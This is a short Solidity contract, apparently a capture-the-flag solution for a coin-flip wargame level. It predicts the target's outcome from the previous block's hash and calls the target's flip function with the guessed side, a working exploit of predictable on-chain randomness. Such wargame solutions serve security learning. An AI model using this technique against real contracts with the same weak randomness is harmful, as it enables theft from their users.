// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract SolutionLevel3 {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipContract;

    constructor(address coinFlip) {
        coinFlipContract = coinFlip;
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(coinFlipContract).flip(side);
    }
}